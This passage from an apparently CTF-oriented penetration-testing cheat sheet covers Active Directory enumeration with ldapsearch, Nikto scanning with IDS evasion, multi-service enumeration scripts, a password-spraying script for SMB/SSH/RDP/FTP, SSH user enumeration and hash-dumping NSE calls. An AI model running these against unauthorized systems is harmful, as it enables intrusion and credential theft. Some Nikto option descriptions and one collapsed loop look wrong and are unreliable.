ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" "+"

# Both standard and operational attributes
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" "*" "+"
```

**Active Directory Specific Queries**

```bash
# Find all domain admins
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)" sAMAccountName

# Find privileged users
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(|(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)(memberOf=CN=Enterprise Admins,CN=Users,DC=domain,DC=local))" sAMAccountName

# Find accounts with password never expires
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" sAMAccountName

# Find accounts with password not required
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName

# Find disabled accounts
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName

# Find service accounts (SPN set)
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find computers
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=computer)" name operatingSystem

# Find domain controllers
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName
```

**Advanced LDAP Filters**

```bash
# Users with email addresses
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(&(objectClass=user)(mail=*))" sAMAccountName mail

# Users with non-empty description field
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(&(objectClass=user)(description=*))" sAMAccountName description

# Groups with specific members
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(member=CN=John Doe,CN=Users,DC=domain,DC=local)" cn

# Find trust relationships
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=trustedDomain)" trustPartner

# Find GPO information
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath
```

**Output Formatting**

```bash
# LDIF format (default)
ldapsearch -x -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"

# Suppress comments (-LLL)
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"

# Output to file
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" > users.ldif

# Tab-separated values (easier parsing)
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" -T "(objectClass=user)" sAMAccountName mail
```

**Parsing LDAP Output**

```bash
# Extract usernames only
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | awk '{print $2}'

# Extract email addresses
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" mail | grep "mail:" | awk '{print $2}'

# Create username list
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | awk '{print $2}' > usernames.txt

# Extract descriptions (often contain passwords in CTF)
ldapsearch -x -LLL -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName description | grep -A1 "sAMAccountName"
```

**Practical LDAP Enumeration Workflow**

```bash
# Step 1: Test anonymous bind
ldapsearch -x -h 10.10.10.10 -b "" -s base "(objectClass=*)" namingContexts

# Step 2: Get base DN
ldapsearch -x -h 10.10.10.10 -b "" -s base "(objectClass=*)" defaultNamingContext | grep "defaultNamingContext" | awk '{print $2}'

# Step 3: Extract all users
BASE_DN=$(ldapsearch -x -h 10.10.10.10 -b "" -s base "(objectClass=*)" defaultNamingContext | grep "defaultNamingContext" | awk '{print $2}')
ldapsearch -x -LLL -h 10.10.10.10 -b "$BASE_DN" "(objectClass=user)" sAMAccountName description > users_full.txt

# Step 4: Check for credentials in descriptions
grep -i "password" users_full.txt

# Step 5: Extract SPNs for Kerberoasting
ldapsearch -x -LLL -h 10.10.10.10 -D "username@domain.local" -w password -b "$BASE_DN" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName > spn_users.txt

# Step 6: Find privileged groups
ldapsearch -x -LLL -h 10.10.10.10 -D "username@domain.local" -w password -b "$BASE_DN" "(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Schema Admins)(cn=Administrators))" member
```

**LDAP with SSL/TLS**

```bash
# LDAPS (port 636)
ldapsearch -x -H ldaps://192.168.1.10:636 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"

# StartTLS (port 389 with encryption)
ldapsearch -x -ZZ -h 192.168.1.10 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"

# Ignore certificate validation (for testing)
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://192.168.1.10:636 -D "username@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"
```

#### Nikto

Nikto is a web server scanner that performs comprehensive tests for vulnerabilities, misconfigurations, outdated software, and dangerous files/programs.

**Basic Usage**

```bash
# Basic scan
nikto -h http://192.168.1.10

# Scan HTTPS
nikto -h https://192.168.1.10

# Scan with specific port
nikto -h 192.168.1.10 -p 8080

# Scan multiple ports
nikto -h 192.168.1.10 -p 80,443,8080,8443

# Scan host from file
nikto -h targets.txt
```

**SSL/TLS Options**

```bash
# Force SSL
nikto -h 192.168.1.10 -ssl

# Disable SSL
nikto -h 192.168.1.10 -nossl

# Specify SSL port
nikto -h 192.168.1.10 -ssl -p 8443

# Ignore SSL certificate warnings
nikto -h https://192.168.1.10 -ssl -nocheck
```

**Tuning Options**

```bash
# Specify scan tuning (test categories)
# 0 - File Upload
# 1 - Interesting File / Seen in logs
# 2 - Misconfiguration / Default File
# 3 - Information Disclosure
# 4 - Injection (XSS/Script/HTML)
# 5 - Remote File Retrieval - Inside Web Root
# 6 - Denial of Service
# 7 - Remote File Retrieval - Server Wide
# 8 - Command Execution / Remote Shell
# 9 - SQL Injection
# a - Authentication Bypass
# b - Software Identification
# c - Remote Source Inclusion
# x - Reverse Tuning Options (exclude)

# Scan for specific vulnerabilities
nikto -h 192.168.1.10 -Tuning 9  # SQL Injection only

# Multiple tuning options
nikto -h 192.168.1.10 -Tuning 123  # Interesting files, misconfig, info disclosure

# All tests except DoS
nikto -h 192.168.1.10 -Tuning x6

# Common CTF tuning
nikto -h 192.168.1.10 -Tuning 123489abc
```

**Authentication**

```bash
# Basic authentication
nikto -h 192.168.1.10 -id username:password

# NTLM authentication
nikto -h 192.168.1.10 -id username:password -Format ntlm

# Form-based authentication
nikto -h 192.168.1.10 -id username:password -Format form -root /login.php
```

**Output Options**

```bash
# Save output to file (text format)
nikto -h 192.168.1.10 -o output.txt

# HTML output
nikto -h 192.168.1.10 -o output.html -Format html

# XML output
nikto -h 192.168.1.10 -o output.xml -Format xml

# CSV output
nikto -h 192.168.1.10 -o output.csv -Format csv

# JSON output
nikto -h 192.168.1.10 -o output.json -Format json

# Multiple formats
nikto -h 192.168.1.10 -o output.txt -Format txt
nikto -h 192.168.1.10 -o output.html -Format htm
```

**Advanced Scanning Options**

```bash
# Verbose output
nikto -h 192.168.1.10 -v

# Display all HTTP responses
nikto -h 192.168.1.10 -Display V

# Specify root directory
nikto -h 192.168.1.10 -root /admin/

# Use specific HTTP method
nikto -h 192.168.1.10 -mutate 1  # Test all files with all root directories

# Mutation techniques
nikto -h 192.168.1.10 -mutate 2  # Guess for password file names
nikto -h 192.168.1.10 -mutate 3  # Enumerate user names via Apache
nikto -h 192.168.1.10 -mutate 4  # Enumerate user names via cgiwrap

# Guess credentials
nikto -h 192.168.1.10 -mutate 5  # Attempt to brute force credentials
nikto -h 192.168.1.10 -mutate 6  # Attempt to bypass authentication

# Use all mutations
nikto -h 192.168.1.10 -mutate-options
```

**Proxy Configuration**

```bash
# Use HTTP proxy
nikto -h 192.168.1.10 -useproxy http://proxy:8080

# Use proxy with authentication
nikto -h 192.168.1.10 -useproxy http://user:pass@proxy:8080

# Use Burp Suite proxy
nikto -h 192.168.1.10 -useproxy http://127.0.0.1:8080
```

**Evasion Techniques**

```bash
# Specify custom User-Agent
nikto -h 192.168.1.10 -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Random User-Agent
nikto -h 192.168.1.10 -useragent random

# Encode requests (IDS evasion)
nikto -h 192.168.1.10 -evasion 1  # Random URI encoding
nikto -h 192.168.1.10 -evasion 2  # Directory self-reference (/./admin)
nikto -h 192.168.1.10 -evasion 3  # Premature URL ending
nikto -h 192.168.1.10 -evasion 4  # Prepend long random string
nikto -h 192.168.1.10 -evasion 5  # Fake parameter
nikto -h 192.168.1.10 -evasion 6  # TAB as request spacer
nikto -h 192.168.1.10 -evasion 7  # Change case of URL
nikto -h 192.168.1.10 -evasion 8  # Use Windows directory separator (\)

# Multiple evasion techniques
nikto -h 192.168.1.10 -evasion 1234567
```

**Performance Tuning**

```bash
# Set timeout
nikto -h 192.168.1.10 -timeout 10

# Set max scan time
nikto -h 192.168.1.10 -maxtime 30m

# Limit scan to specific number of findings
nikto -h 192.168.1.10 -maxfind 50

# Pause between tests (seconds)
nikto -h 192.168.1.10 -Pause 2

# Single request mode
nikto -h 192.168.1.10 -Single

# No 404 checks (faster but less accurate)
nikto -h 192.168.1.10 -no404
```

**Plugin Management**

```bash
# List available plugins
nikto -list-plugins

# Use specific plugins
nikto -h 192.168.1.10 -Plugins "headers,cookies"

# Exclude specific plugins
nikto -h 192.168.1.10 -Plugins "@@DEFAULT;-apache_expect_xss"

# Update plugins database
nikto -update
```

**Practical Nikto Workflows**

```bash
# CTF Quick Scan
nikto -h http://10.10.10.10 -Tuning 123489abc -o nikto_quick.txt

# Comprehensive Scan with Output
nikto -h http://10.10.10.10 -Tuning 0123456789abc -o nikto_full.html -Format html

# Authenticated Scan
nikto -h http://10.10.10.10 -id admin:password -root /admin/ -Tuning 123489

# Scan Through Proxy (Burp Suite)
nikto -h http://10.10.10.10 -useproxy http://127.0.0.1:8080 -Tuning 123489abc

# Stealthy Scan with Evasion
nikto -h http://10.10.10.10 -evasion 1234567 -useragent random -Pause 2 -timeout 20

# Multiple Hosts from Nmap Output

# Extract web servers from nmap

grep "open" nmap_scan.gnmap | grep -E "80|443|8080|8443" | awk '{print $2}' > web_targets.txt

# Scan each target

while read host; do nikto -h http://$host -o nikto_$host.txt nikto -h https://$host -ssl -o nikto_ssl_$host.txt done < web_targets.txt

````

**Parsing Nikto Output**

```bash
# Run scan and save
nikto -h http://192.168.1.10 -o nikto_output.txt

# Extract critical findings
grep -i "critical\|high" nikto_output.txt

# Extract specific vulnerability types
grep -i "xss\|injection\|disclosure" nikto_output.txt

# Find interesting files
grep "+ /" nikto_output.txt | grep -E "admin|backup|config|password"

# Extract URLs for further testing
grep "+ /" nikto_output.txt | awk '{print $2}' > discovered_paths.txt

# Count findings by severity
grep -c "OSVDB" nikto_output.txt
````

**Integration with Other Tools**

```bash
# Use Nikto results with Burp Suite
nikto -h http://192.168.1.10 -useproxy http://127.0.0.1:8080

# Combine with dirb/gobuster findings
# First run dirb
dirb http://192.168.1.10 -o dirb_results.txt

# Extract directories
cat dirb_results.txt | grep "DIRECTORY" | awk '{print $3}' | while read dir; do
    nikto -h http://192.168.1.10 -root $dir
done

# Chain with curl for verification
nikto -h http://192.168.1.10 -o nikto.txt
grep "+ /" nikto.txt | awk '{print $2}' | while read path; do
    echo "Testing: $path"
    curl -I http://192.168.1.10$path
done
```

**Custom Nikto Database Queries**

```bash
# Database location
ls /usr/share/nikto/databases/

# View specific database entries
cat /usr/share/nikto/databases/db_tests | grep -i "admin"

# Search for specific vulnerability
cat /usr/share/nikto/databases/db_tests | grep -i "shellshock"

# Custom test creation
echo '"custom_001","0","Custom Test","GET","200","","","Custom description"' >> /usr/share/nikto/databases/db_tests
```

**Nikto Configuration File**

```bash
# Create custom config
cat > nikto.conf << 'EOF'
# Nikto Configuration
CLIOPTS=-Tuning 123489abc -evasion 1234
USERAGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64)
TIMEOUT=30
MAXTIME=1h
PLUGINS=@@DEFAULT
EOF

# Use custom config
nikto -h http://192.168.1.10 -config nikto.conf
```

#### Enumeration Tool Comparison and Integration

**Tool Selection Matrix**

|Service|Primary Tool|Alternative|Use Case|
|---|---|---|---|
|SMB/CIFS|enum4linux, smbmap|smbclient, crackmapexec|Share enumeration, user discovery|
|LDAP/AD|ldapsearch|ldapdomaindump, windapsearch|Domain enumeration, user/group discovery|
|Web Servers|nikto|dirb, gobuster, wfuzz|Vulnerability scanning, file discovery|
|DNS|dig, nslookup|dnsenum, fierce|Zone transfers, subdomain enumeration|
|SNMP|snmpwalk|onesixtyone, snmp-check|Device configuration enumeration|

**Comprehensive Enumeration Workflow**

```bash
#!/bin/bash
# comprehensive_enum.sh - Complete enumeration workflow

TARGET="10.10.10.10"
OUTPUT_DIR="enum_results"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive enumeration of $TARGET"

# 1. Port Scanning
echo "[+] Running port scan..."
nmap -p- -sV -sC -A -T4 --open $TARGET -oA $OUTPUT_DIR/nmap_full

# 2. Extract services
SERVICES=$(cat $OUTPUT_DIR/nmap_full.gnmap | grep "Ports:" | cut -d":" -f2-)

# 3. SMB Enumeration (if port 445 open)
if echo "$SERVICES" | grep -q "445/open"; then
    echo "[+] Enumerating SMB..."
    enum4linux -a $TARGET > $OUTPUT_DIR/enum4linux.txt
    smbmap -H $TARGET -u guest > $OUTPUT_DIR/smbmap_guest.txt
    smbmap -H $TARGET -u null -p "" > $OUTPUT_DIR/smbmap_null.txt
fi

# 4. LDAP Enumeration (if port 389 open)
if echo "$SERVICES" | grep -q "389/open"; then
    echo "[+] Enumerating LDAP..."
    ldapsearch -x -h $TARGET -b "" -s base "(objectClass=*)" namingContexts > $OUTPUT_DIR/ldap_base.txt
    BASE_DN=$(cat $OUTPUT_DIR/ldap_base.txt | grep "defaultNamingContext" | awk '{print $2}')
    if [ ! -z "$BASE_DN" ]; then
        ldapsearch -x -LLL -h $TARGET -b "$BASE_DN" "(objectClass=user)" sAMAccountName description > $OUTPUT_DIR/ldap_users.txt
        ldapsearch -x -LLL -h $TARGET -b "$BASE_DN" "(objectClass=group)" > $OUTPUT_DIR/ldap_groups.txt
    fi
fi

# 5. Web Enumeration (if HTTP/HTTPS ports open)
for port in 80 443 8080 8443; do
    if echo "$SERVICES" | grep -q "$port/open"; then
        echo "[+] Enumerating web service on port $port..."
        if [ "$port" == "443" ] || [ "$port" == "8443" ]; then
            nikto -h https://$TARGET:$port -o $OUTPUT_DIR/nikto_$port.txt
            gobuster dir -u https://$TARGET:$port -w /usr/share/wordlists/dirb/common.txt -o $OUTPUT_DIR/gobuster_$port.txt -k
        else
            nikto -h http://$TARGET:$port -o $OUTPUT_DIR/nikto_$port.txt
            gobuster dir -u http://$TARGET:$port -w /usr/share/wordlists/dirb/common.txt -o $OUTPUT_DIR/gobuster_$port.txt
        fi
    fi
done

# 6. Generate summary
echo "[+] Generating summary..."
cat > $OUTPUT_DIR/summary.txt << EOF
Enumeration Summary for $TARGET
================================

Open Ports:
$(grep "open" $OUTPUT_DIR/nmap_full.gnmap)

SMB Shares Found:
$(grep "READ\|WRITE" $OUTPUT_DIR/smbmap*.txt 2>/dev/null | head -n 20)

LDAP Users Found:
$(grep "sAMAccountName:" $OUTPUT_DIR/ldap_users.txt 2>/dev/null | wc -l)

Web Vulnerabilities:
$(grep -c "OSVDB" $OUTPUT_DIR/nikto*.txt 2>/dev/null)

Interesting Web Paths:
$(grep "Status: 200" $OUTPUT_DIR/gobuster*.txt 2>/dev/null | head -n 20)
EOF

echo "[*] Enumeration complete. Results saved to $OUTPUT_DIR/"
cat $OUTPUT_DIR/summary.txt
```

**Multi-Service Enumeration Script**

```bash
#!/bin/bash
# multi_service_enum.sh - Service-specific enumeration

HOST=$1
DOMAIN=$2  # Optional for AD environments

if [ -z "$HOST" ]; then
    echo "Usage: $0 <host> [domain]"
    exit 1
fi

# SMB Enumeration Function
enumerate_smb() {
    echo "[SMB] Starting enumeration..."
    
    # Try different authentication methods
    smbmap -H $HOST -u "" -p "" > smb_null.txt
    smbmap -H $HOST -u "guest" -p "" > smb_guest.txt
    enum4linux -a $HOST > enum4linux_full.txt
    
    # Extract usernames
    cat enum4linux_full.txt | grep "user:" | cut -d"[" -f2 | cut -d"]" -f1 | sort -u > usernames.txt
    
    # Extract shares
    cat smb_*.txt | grep -E "READ|WRITE" | awk '{print $1}' | sort -u > shares.txt
    
    echo "[SMB] Found $(cat usernames.txt | wc -l) users and $(cat shares.txt | wc -l) accessible shares"
}

# LDAP Enumeration Function
enumerate_ldap() {
    echo "[LDAP] Starting enumeration..."
    
    if [ -z "$DOMAIN" ]; then
        echo "[LDAP] No domain provided, attempting to discover..."
        BASE_DN=$(ldapsearch -x -h $HOST -b "" -s base "(objectClass=*)" defaultNamingContext | grep "defaultNamingContext" | awk '{print $2}')
    else
        BASE_DN=$(echo $DOMAIN | sed 's/\./,dc=/g' | sed 's/^/dc=/')
    fi
    
    if [ ! -z "$BASE_DN" ]; then
        echo "[LDAP] Using base DN: $BASE_DN"
        
        # Extract users
        ldapsearch -x -LLL -h $HOST -b "$BASE_DN" "(objectClass=user)" sAMAccountName mail description > ldap_users.txt
        
        # Extract groups
        ldapsearch -x -LLL -h $HOST -b "$BASE_DN" "(objectClass=group)" cn member > ldap_groups.txt
        
        # Find privileged users
        ldapsearch -x -LLL -h $HOST -b "$BASE_DN" "(memberOf=CN=Domain Admins,CN=Users,$BASE_DN)" sAMAccountName > ldap_admins.txt
        
        # Find SPNs (for Kerberoasting)
        ldapsearch -x -LLL -h $HOST -b "$BASE_DN" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName > ldap_spn.txt
        
        echo "[LDAP] Enumeration complete"
    else
        echo "[LDAP] Could not determine base DN"
    fi
}

# Web Enumeration Function
enumerate_web() {
    local PORT=$1
    local PROTO=$2
    
    echo "[WEB] Enumerating ${PROTO}://${HOST}:${PORT}..."
    
    # Nikto scan
    nikto -h ${PROTO}://${HOST}:${PORT} -Tuning 123489abc -o nikto_${PORT}.txt
    
    # Directory bruteforce
    gobuster dir -u ${PROTO}://${HOST}:${PORT} -w /usr/share/wordlists/dirb/common.txt -o gobuster_${PORT}.txt -t 50 2>/dev/null
    
    # Check for common files
    for file in robots.txt sitemap.xml .git/config .svn/entries backup.zip; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" ${PROTO}://${HOST}:${PORT}/$file)
        if [ "$STATUS" == "200" ]; then
            echo "[WEB] Found: $file (HTTP $STATUS)"
        fi
    done
}

# Main execution
echo "[*] Starting enumeration of $HOST"

# Determine open ports
nmap -p- --open -T4 $HOST -oG nmap_ports.txt > /dev/null 2>&1
OPEN_PORTS=$(grep "Ports:" nmap_ports.txt | cut -d":" -f2- | tr ',' '\n' | grep "open" | cut -d"/" -f1)

echo "[*] Open ports: $(echo $OPEN_PORTS | tr '\n' ' ')"

# Service-specific enumeration
for PORT in $OPEN_PORTS; do
    case $PORT in
        139|445)
            enumerate_smb
            ;;
        389)
            enumerate_ldap
            ;;
        80)
            enumerate_web 80 "http"
            ;;
        443)
            enumerate_web 443 "https"
            ;;
        8080)
            enumerate_web 8080 "http"
            ;;
        8443)
            enumerate_web 8443 "https"
            ;;
    esac
done

echo "[*] Enumeration complete!"
```

**Credential Spray with Enumerated Users**

```bash
#!/bin/bash
# credential_spray.sh - Use enumerated users for credential attacks

USERS_FILE=$1
PASSWORD=$2
TARGET=$3
SERVICE=$4  # smb, ssh, rdp, etc.

if [ $# -lt 4 ]; then
    echo "Usage: $0 <users_file> <password> <target> <service>"
    echo "Services: smb, ssh, rdp, ftp"
    exit 1
fi

case $SERVICE in
    smb)
        cat $USERS_FILE | while read user; do
            echo "[*] Trying $user:$PASSWORD"
            smbmap -H $TARGET -u "$user" -p "$PASSWORD" 2>/dev/null | grep -v "Authentication error"
        done
        ;;
    ssh)
        cat $USERS_FILE | while read user; do
            echo "[*] Trying $user:$PASSWORD"
            sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $user@$TARGET "whoami" 2>/dev/null && echo "[+] SUCCESS: $user:$PASSWORD"
        done
        ;;
    rdp)
        cat $USERS_FILE | while read user; do
            echo "[*] Trying $user:$PASSWORD"
            xfreerdp /u:$user /p:$PASSWORD /v:$TARGET /cert-ignore 2>&1 | grep -i "Authentication only, exit status 0" && echo "[+] SUCCESS: $user:$PASSWORD"
        done
        ;;
    ftp)
        cat $USERS_FILE | while read user; do
            echo "[*] Trying $user:$PASSWORD"
            ftp -n $TARGET <<EOF 2>&1 | grep -i "230 Login" && echo "[+] SUCCESS: $user:$PASSWORD"
user $user
pass $PASSWORD
quit
EOF
        done
        ;;
esac
```

#### Additional Enumeration Tools

**DNS Enumeration**

```bash
# dnsenum - comprehensive DNS enumeration
dnsenum --enum domain.local -f /usr/share/wordlists/dnsmap.txt

# fierce - DNS reconnaissance
fierce --domain domain.local --subdomains accounts,admin,www,mail,ftp

# dnsrecon - DNS enumeration
dnsrecon -d domain.local -t std
dnsrecon -d domain.local -t axfr  # Zone transfer
dnsrecon -d domain.local -t brt -D /usr/share/wordlists/subdomains.txt

# dig - manual DNS queries
dig @192.168.1.10 domain.local ANY
dig @192.168.1.10 domain.local AXFR  # Zone transfer attempt
```

**SNMP Enumeration**

```bash
# snmpwalk - walk entire MIB tree
snmpwalk -v2c -c public 192.168.1.10

# Specific OID queries
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.1  # System info
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.6.13.1.3  # TCP connections
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2  # Running processes

# onesixtyone - SNMP community string scanner
onesixtyone -c /usr/share/wordlists/snmp-strings.txt 192.168.1.10

# snmp-check - automated SNMP enumeration
snmp-check 192.168.1.10 -c public
```

**NFS Enumeration**

```bash
# showmount - list NFS exports
showmount -e 192.168.1.10

# nmap NSE scripts for NFS
nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs 192.168.1.10

# Mount NFS share
mkdir /tmp/nfs_mount
mount -t nfs 192.168.1.10:/share /tmp/nfs_mount
```

**Database Enumeration**

```bash
# MySQL enumeration
nmap -p 3306 --script mysql-enum,mysql-info,mysql-databases,mysql-users 192.168.1.10
mysql -h 192.168.1.10 -u root -p

# PostgreSQL enumeration
nmap -p 5432 --script pgsql-brute 192.168.1.10
psql -h 192.168.1.10 -U postgres

# MSSQL enumeration
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-dump-hashes 192.168.1.10
sqsh -S 192.168.1.10 -U sa -P password

# MongoDB enumeration
nmap -p 27017 --script mongodb-info,mongodb-databases 192.168.1.10
mongo 192.168.1.10
```

**SSH Enumeration**

```bash
# SSH user enumeration (timing attack)
# [Inference] Works on older OpenSSH versions
python /usr/share/exploitdb/exploits/linux/remote/40136.py 192.168.1.10 root admin user

# Enumerate SSH algorithms
nmap -p 22 --script ssh2-enum-algos 192.168.1.10

# Check for weak keys
nmap -p 22 --script ssh-hostkey 192.168.1.10

# SSH audit
ssh-audit 192.168.1.10
```

**RPC Enumeration**

```bash
# rpcclient - SMB RPC client
rpcclient -U "" -N 192.168.1.10
# Commands within rpcclient:
# enumdomusers - enumerate domain users
# enumdomgroups - enumerate domain groups
# queryuser <RID> - query user info
# querygroupmem <RID> - query group membership

# rpcinfo - RPC service enumeration
rpcinfo -p 192.168.1.10

# nmap RPC enumeration
nmap -p 111,135 --script rpc-grind,rpcinfo 192.168.1.10
```

#### Enumeration Best Practices for CTF

**Systematic Approach**

```bash
# 1. Start with passive reconnaissance
whois domain.com
dig domain.com ANY
nslookup domain.com

# 2. Active host discovery
nmap -sn 10.10.10.0/24

# 3. Port scanning
nmap -p- -T4 --open 10.10.10.10

# 4. Service enumeration
nmap -p <ports> -sV -sC 10.10.10.10

# 5. Service-specific deep enumeration
# Based on discovered services

# 6. Credential attacks (if applicable)
# Using discovered usernames

# 7. Exploitation preparation
# Document findings, identify attack vectors
```

**Information Organization**

```bash
# Create structured directory
mkdir -p ctf_enum/{nmap,web,smb,ldap,misc,credentials,exploits}

# Naming conventions
# nmap_<target>_<scan_type>.{nmap,gnmap,xml}
# enum4linux_<target>.txt
# nikto_<target>_<port>.txt
# smbmap_<target>_<auth_method>.txt

# Keep a notes file
cat > ctf_enum/notes.md << 'EOF'
# Target: 10.10.10.10

## Summary
- OS: 
- Open Ports:
- Services:

## Findings
### Port 80 - HTTP
- 

### Port 445 - SMB
- 

## Credentials Found
- 

## Attack Vectors
- 
EOF
```

#### Important Related Topics

**Critical subtopics for comprehensive enumeration:**

- **Active Directory enumeration** - BloodHound, PowerView, and advanced AD reconnaissance
- **Web application enumeration** - Directory bruteforcing with gobuster, ffuf, and wfuzz
- **API enumeration** - REST/GraphQL endpoint discovery and testing
- **Cloud service enumeration** - AWS, Azure, GCP reconnaissance techniques
- **Wireless network enumeration** - WiFi scanning, Bluetooth enumeration

---

### Web Testing

**Burp Suite**

```bash
# Launch Burp Suite
burpsuite

# Community Edition (Free)
# Professional Edition (Paid - advanced features)

# Key Features:
# - Proxy interceptor
# - Intruder (brute forcing)
# - Repeater (request modification)
# - Scanner (Pro only)
# - Sequencer (session token analysis)
```

**Common Burp Suite Workflows**

```bash
# 1. Configure Browser Proxy
# Firefox: Preferences → Network Settings
# Manual proxy: 127.0.0.1:8080

# 2. SSL/TLS Certificate Installation
# Navigate to: http://burp
# Download: cacert.der
# Firefox: Preferences → Certificates → Import

# 3. Intercept and Modify Requests
# Proxy → Intercept → Intercept is On
# Modify parameters, headers, cookies
# Forward or Drop request

# 4. Spider/Crawl Target
# Target → Site map → Right-click domain → Spider this host

# 5. Intruder Attack Types
# - Sniper: Single payload position
# - Battering ram: Same payload in all positions
# - Pitchfork: Multiple payloads, parallel iteration
# - Cluster bomb: All payload combinations

# Example: Password brute force
# 1. Capture login request in Proxy
# 2. Send to Intruder (Ctrl+I)
# 3. Clear all positions (§)
# 4. Mark password field: §password§
# 5. Payloads → Load wordlist
# 6. Start attack
# 7. Analyze responses by length/status

# 6. Repeater Usage
# Send request to Repeater (Ctrl+R)
# Modify and resend multiple times
# Useful for: SQLi testing, parameter tampering

# 7. Decoder Usage
# Decode/Encode: Base64, URL, HTML, Hex
# Hash: MD5, SHA1, SHA256

# 8. Comparer Usage
# Compare two requests/responses
# Identify differences (word/byte level)

# 9. Sequencer Usage
# Analyze randomness of session tokens
# Capture tokens → Analyze
# Identify predictable patterns
```

**Burp Suite Extensions**

```bash
# Useful Extensions (BApp Store):
# - Autorize: Authorization testing
# - J2EEScan: Java vulnerability scanner
# - Retire.js: JavaScript library vulnerabilities
# - Param Miner: Parameter discovery
# - Turbo Intruder: High-speed attacks
# - Upload Scanner: File upload testing
# - CSRF Scanner: CSRF vulnerability detection
# - CO2: Collection of utilities
# - Logger++: Enhanced logging

# Installing Extensions
# Extender → BApp Store → Select → Install
```

**OWASP ZAP (Zed Attack Proxy)**

```bash
# Launch ZAP
zaproxy
# Or
owasp-zap

# Automated Scan
zap.sh -quickurl http://target.com -quickout report.html

# Command-line baseline scan
zap-baseline.py -t http://target.com

# Full scan
zap-full-scan.py -t http://target.com

# API scan
zap-api-scan.py -t http://target.com/api/openapi.json

# Daemon mode (headless)
zap.sh -daemon -port 8090 -config api.disablekey=true

# With API key
zap.sh -daemon -port 8090 -config api.key=your_api_key
```

**ZAP Key Features**

```bash
# 1. Automated Scanner
# Quick Start → Automated Scan
# Enter URL → Attack

# 2. Manual Explore
# Quick Start → Manual Explore
# Launch browser → Browse target
# ZAP captures all traffic

# 3. Active Scan
# Right-click site in Sites tree
# Attack → Active Scan

# 4. Spider/Crawler
# Tools → Spider
# Configure scope
# Start scan

# 5. Ajax Spider
# Tools → Ajax Spider
# Better for JavaScript-heavy sites

# 6. Fuzzer
# Right-click request
# Attack → Fuzz
# Add payload locations
# Select payload list
# Start fuzzer

# 7. Forced Browse
# Tools → Forced Browse
# Directory/file discovery

# 8. Session Management
# Analyze session tokens
# Test session fixation
# Check token entropy
```

**ZAP Scripts and Automation**

```bash
# Python API example
from zapv2 import ZAPv2

apikey = 'your_api_key'
target = 'http://target.com'

zap = ZAPv2(apikey=apikey, proxies={'http': 'http://127.0.0.1:8090', 'https': 'http://127.0.0.1:8090'})

# Spider
print('Spidering target...')
scanid = zap.spider.scan(target)
